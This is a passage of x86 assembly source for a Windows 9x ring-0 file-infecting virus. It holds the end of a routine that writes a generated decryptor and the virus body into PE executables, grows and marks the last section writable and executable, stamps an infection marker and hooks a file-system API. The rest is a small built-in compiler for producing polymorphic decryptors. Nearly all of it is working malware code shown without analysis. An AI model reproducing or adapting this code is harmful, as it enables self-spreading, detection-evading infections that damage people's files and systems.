        mov     eax,[TempPtr+edi]
        push    eax
        push    R0_FreeMem
        call    vxd
        pop     eax

        mov     esi,[DecryptorPos+edi]

        mov     eax,[DecryptorSize+edi]
        add     eax,100

; allocate mem for PEHeader
        push    eax
        push    R0_AllocMem
        call    vxd
        pop     ecx
        test    eax,eax
        jz      FileFunctionEndCloseFile
        mov     [TempPtr+edi],eax

        push    edi
        mov     ebp,edi
        mov     edi,eax
        call    Compile

        pop     edi

; write Decryptor
        mov     edx,[NewDecryptorOffset+edi]
        mov     ecx,[DecryptorSize+edi]

        call    FileIOWrite

        mov     eax,[TempPtr+edi]
        push    eax
        push    R0_FreeMem
        call    vxd
        pop     eax

        popad

        mov     edx,[NewDataSegmentOffset+edi]
        mov     ecx,MemorySize*4
        mov     esi,[VirtualDataSegment+edi]
        call    FileIOWrite


        mov     edx,[NewDecryptorOffset+edi]
        add     edx,[DecryptorSize+edi]
        mov     ecx,VSize
        mov     esi,[VirusInRing0Mem+edi]
        call    FileIOWrite


        mov     ebx,VSize
        add     ebx,[DecryptorSize+edi]

        mov     esi,[LastObjectPtr+edi]
        mov     eax,[esi+Obj_PhysicalSize]      ; physical size
        add     eax,ebx                         ; add with new virussize
        add     eax,100                         ; safety



        mov     edx,[PEHeadStart+edi]
        mov     ecx,[edx+PE_ObjectAlign]        ; object align
        xor     edx,edx
        div     ecx
        inc     eax
        xor     edx,edx
        mul     ecx

        .if      eax>[esi+8]
        mov     [esi+Obj_VirtualSize],eax       ; save new virtual size
        .endif


        mov     eax,[esi+Obj_PhysicalSize]      ; physical size
        add     eax,ebx                         ; add with virus size
        add     eax,20                          ; safety

        mov     edx,[PEHeadStart+edi]
        mov     ecx,[edx+PE_FileAlign]          ; file align
        xor     edx,edx
        div     ecx
        inc     eax
        xor     edx,edx
        mul     ecx

        mov     [esi+Obj_PhysicalSize],eax      ; save new physical size

        mov     eax,'y3k?'
        mov     ecx,[PEHeadStart+edi]
        mov     [ecx+12],eax

        mov     eax,[LastObjectPtr+edi]
        mov     esi,0c0000040h
        mov     [eax+Obj_Flags],esi

        mov     eax,[ecx+PE_ImageSize]          ; size of image
        add     eax,VirusSize                   ; add with virussize
        mov     ecx,[ecx+PE_ObjectAlign]        ; object aligment
        xor     edx,edx
        div     ecx
        inc     eax
        xor     edx,edx
        mul     ecx                             ; new size of image in eax
        mov     esi,[PEHeadStart+edi]
        mov     [esi+PE_ImageSize],eax          ; save it

        mov     edx,[PEHeadOfs+edi]             ; write to
        mov     ecx,[HeaderSize+edi]
        call    FileIOWrite

FileFunctionEndAddEsp:
        mov     eax,[PEHeadStart+edi]
        push    eax
        push    R0_FreeMem
        call    vxd
        pop     eax

FileFunctionEndCloseFile:

        mov     eax,R0_CLOSEFILE
        call    FileIOHandle

FileFunctionEnd:
        xor     eax,eax
        mov     [edi+Flag], eax

CallInOurFunction:
        mov     eax,[edi+OldAPIFunction]
        mov     ecx,edi


        pop     ebx
        pop     esi
        pop     edi
        pop     ebp

        pop     [ReturnFromHook+ecx]
        lea     edx,[ReturnFromHook+ecx+4]
        sub     [ReturnFromHook+ecx],edx

        call    dword ptr [eax]

        db      0e9h
  ReturnFromHook:
        dd      0

















; ------------------------------
; --------------------- Compiler
; ------------------------------

PointerToRandomMemory   equ     MemorySize

PointerToDataSlack      dd      0

SavedOffsets            dd      10 dup (-1)

InstructionTable:
dd      Op_add
dd      Op_and
dd      Op_cmp
dd      Op_or
dd      Op_sub
dd      Op_xor

dd      Op_mov
dd      Op_jmp

dd      Op_jnz
dd      Op_jnb
dd      Op_jna


dd      Op_offset
dd      Op_db
InstructionTableEnd:

InstructionTables:
AddTable:
        dd      DefaultProc1
        db      00000000b
        db      10000000b
        db      00000100b
        db      000b

AndTable:
        dd      DefaultProc1
        db      00100000b
        db      10000000b
        db      00100100b
        db      100b

CmpTable:
        dd      DefaultProc1
        db      00111000b
        db      10000000b
        db      00111100b
        db      111b

OrTable:
        dd      DefaultProc1
        db      00001000b
        db      10000000b
        db      00001100b
        db      001b

SubTable:
        dd      DefaultProc1
        db      00101000b
        db      10000000b
        db      00101100b
        db      101b

XorTable:
        dd      DefaultProc1
        db      00110000b
        db      10000000b
        db      00110100b
        db      110b

MovTable:
        dd      MoveProc
        db      10001000b
        db      11000110b
        db      10111000b
        db      000b


JmpTable:
        dd      JmpProc
        dd      0


JnzTable:
        dd      JxxProc
        db      0101b
        db      0,0,0

JnbTable:
        dd      JxxProc
        db      0011b
        db      0,0,0

JnaTable:
        dd      JxxProc
        db      0110b
        db      0,0,0



OffsetTable:
        dd      OffsetProc
        dd      0

DeclareByteTable:
        dd      DeclareByteProc
        dd      0






ToValue                 dd      0
ToTypeOfValue           dd      0

SecondValue             dd      0
SecondTypeOfValue       dd      0




Instruction             dd      0,0,0
InstructionLength       dd      0


RegistersBitValue:
dd      0
IntelEax                dd      000b
IntelEbx                dd      011b
IntelEcx                dd      001b
IntelEdx                dd      010b
IntelEsi                dd      110b
IntelEdi                dd      111b
IntelEsp                dd      100b


   ReadInstruction1:
        push    edi
        lea     edi,[InstructionTable+ebp]

        mov     ecx,(InstructionTableEnd-InstructionTable)/4+1
        add     esi,16
        and     esi,0fffffff0h

        lodsd
        bswap   eax

        push    edi
        repnz   scasd

        sub     edi,[esp]

        shl     edi,1

        lea     ebx,[edi+4-8+InstructionTables+ebp]

        mov     eax,[ebx-4]
        add     eax,ebp
        pop     edi
        pop     edi

        test    ecx,ecx
        jz      CompileEnd

        jmp     eax





   ReadOperands:
        call    GetOperand
        mov     [ToValue+ebp],eax
        mov     [ToTypeOfValue+ebp],ebx

        mov     al,byte ptr [esi]
        cmp     al,','
        jnz     Return
        inc     esi

        call    GetOperand
        mov     [SecondValue+ebp],eax
        mov     [SecondTypeOfValue+ebp],ebx
        ret












SetDirectionBit:
        call    WhatOperandIsRegMem
        setl    bl
        shl     ebx,1

        or      [Instruction+ebp],ebx
        ret


GetOther:
        call    WhatOperandIsRegMem
        jnl     Label40

        mov     eax,[ToValue+ebp]
        mov     ebx,[ToTypeOfValue+ebp]
        ret

GetRegMem:
        call    WhatOperandIsRegMem
        jl      Label40

        mov     eax,[ToValue+ebp]
        mov     ebx,[ToTypeOfValue+ebp]
        ret

    Label40:
        mov     eax,[SecondValue+ebp]
        mov     ebx,[SecondTypeOfValue+ebp]
        ret


RegMem_Reg                      equ     0
RegMem_Immediate                equ     1
Eax_Immediate                   equ     2


FetchOpcode:
        call    GetRegMem

        cmp     ebx,4
        setz    bl
        cmp     eax,1
        setz    al
        and     eax,ebx
        mov     ecx,eax

        call    GetOther
        xor     eax,eax
        test    ebx,ebx
        jnz     Return

        inc     eax
        add     eax,ecx
        ret




WhatOperandIsRegMem:
        xor     ebx,ebx
        mov     eax,[ToTypeOfValue+ebp]
        cmp     eax,[SecondTypeOfValue+ebp]
        ret

FixAddresses:
        lea     edx,[Instruction+ebp]
        add     edx,[InstructionLength+ebp]


        call    GetRegMem
        xor     ecx,ecx
        cmp     ebx,8
        setl    cl
        imul    ecx,ecx,3
        shl     ecx,6

        cmp     ebx,8
        jz      MemoryValue

        mov     eax,[eax*4+RegistersBitValue+ebp]

        or      ecx,eax
        jmp     Label43



   MemoryValue:
        or      ecx,101b
        mov     [edx+1],eax
        add     [InstructionLength+ebp],4

   Label43:
        inc     [InstructionLength+ebp]

        call    GetOther
        test    ebx,ebx
        jz      LastOperandIsImmediate
        mov     eax,[eax*4+RegistersBitValue+ebp]
        shl     eax,3
        or      ecx,eax

        mov     byte ptr [edx],cl
        ret

   LastOperandIsImmediate:
        push    edx
        lea     edx,[Instruction+ebp]
        add     edx,[InstructionLength+ebp]
        mov     [edx],eax
        add     [InstructionLength+ebp],4
        pop     edx

        or      byte ptr [edx],cl
        ret

OutputInstruction:
        push    esi
        lea     esi,[Instruction+ebp]
        mov     ecx,[InstructionLength+ebp]
        rep     movsb
        pop     esi
        ret


; input
; Edi -> where to put compiled code
; Esi -> code to compile

; return
; eax = where to put compiled code
; ebx = size of compiled code
Compile:
        push    edi
        sub     esi,16

CompileAgain:
        mov     [Instruction+ebp],0
        mov     [InstructionLength+ebp],0
        call    ReadInstruction1
        mov     al,0c3h
        mov     byte ptr [edi],al
        jmp     CompileAgain

CompileEnd:
        pop     esi
        pop     esi
        mov     eax,edi
        sub     eax,esi
        ret



OffsetProc:
        call    AsciiToNum
        mov     [SavedOffsets+ebp+eax*4],edi
        ret

DeclareByteProc:
        xor     eax,eax
        lodsb
        mov     ecx,eax
        rep     movsb
        ret

MoveProc:
        push    ebx
        call    ReadOperands
        call    SetDirectionBit
        call    FetchOpcode

        test    eax,eax
        jz      DefaultProc1Label1
        call    GetRegMem
        mov     ecx,eax
        mov     eax,1
        cmp     ebx,8
        jz      DefaultProc1Label1

        mov     eax,[ecx*4+RegistersBitValue+ebp]
        lea     edx,[Instruction+ebp]
        pop     ebx
        or      al,byte ptr [ebx+2]

        mov     [edx],eax

        call    GetOther
        mov     [edx+1],eax
        mov     [InstructionLength+ebp],5
        jmp     OutputInstruction



DefaultProc1:
        push    ebx
        call    ReadOperands
        call    SetDirectionBit
        call    FetchOpcode

     DefaultProc1Label1:
        pop     ebx
        add     ebx,eax

        movzx   ecx,byte ptr [ebx]
        inc     ecx

        dec     eax
        jnz     Label41
        mov     ch,byte ptr [ebx+2]
        shl     ch,3

    Label41:

        or      [Instruction+ebp],ecx
        inc     [InstructionLength+ebp]

        dec     eax
        jz      CopyDataToInstruction

        call    FixAddresses
        jmp     OutputInstruction

    CopyDataToInstruction:
        call    GetOther
        lea     ebx,[Instruction+ebp]
        add     ebx,[InstructionLength+ebp]
        mov     [ebx],eax
        add     [InstructionLength+ebp],4
        jmp     OutputInstruction


;-JMP-------Jump
;Near,8-bit      |1|1|1|0|1|0|1|1|  8-bit Displacement
;Near,Direct     |1|1|1|0|1|0|0|1|  Full Displacement
;Near,Indirect   |1|1|1|1|1|1|1|1|  |mod|1|0|0| R/M |


JmpProc:
        call    GetOperand
        xor     ecx,ecx

        test    ebx,ebx
        jz      JumpIsIndirect

        mov     ebx,[eax*4+RegistersBitValue+ebp]

        mov     al,0ffh
        stosb

        mov     eax,ebx
        or      eax,00100000b
        stosb
        ret

   JumpIsIndirect:
        mov     ebx,[SavedOffsets+ebp+eax]
        sub     ebx,edi

        add     ebx,4

        test    ebx,0fffffff8h
        jz      OutPutSmallJump

        ret


JxxProc:
        movzx   edx,byte ptr [ebx]
        push    edx
        call    GetOperand
        pop     edx

        mov     ebx,[SavedOffsets+ebp+eax]
        sub     ebx,edi

        add     ebx,4

        test    ebx,0fffffff8h
        jz      OutPutSmallJump

        mov     al,0fh
        stosb

        mov     al,10000000b
        or      eax,edx
        stosb

        sub     ebx,6+4
        mov     eax,ebx
        stosd
        ret


OutPutSmallJump:
        mov     al,01110000b
        or      eax,edx
        stosb
        mov     eax,ebx
        sub     eax,2+4
        stosb
        ret

        ret


GetOperand:
        xor     edx,edx
        mov     al,byte ptr [esi]
        cmp     al,'['
        setz    dl
        mov     ecx,edx
        add     esi,edx
        shl     edx,3
        mov     ebx,edx                         ; ebx = 0 or 8

        lodsb
        cmp     al,'S'                          ; A variable
        jnz     Label53

        mov     edx,[PointerToDataSlack+ebp]
        lodsd
        mov     eax,[edx+eax*4]
        add     esi,ecx
        xor     edx,edx
        ret

     Label53:
        cmp     al,'R'
        setz    dl
        shl     edx,2
        add     ebx,edx                         ; ebx = ebx + (0 or 4)

        test    edx,edx                         ; is value
        jz      ReadValue

        xor     eax,eax
        lodsb                                   ; read register

        cmp     al,'X'
        jz      GetRandomReg

        sub     eax,'0'

        add     esi,ecx
        ret

   ReadValue:
        lodsd
        add     esi,ecx
        ret

Return:
        ret

AsciiToNum:
        xor     eax,eax
        lodsb
        sub     eax,'0'
        ret


ResidentcodeEnd:



  VirusEnd:
_rsrc   ends
end Main
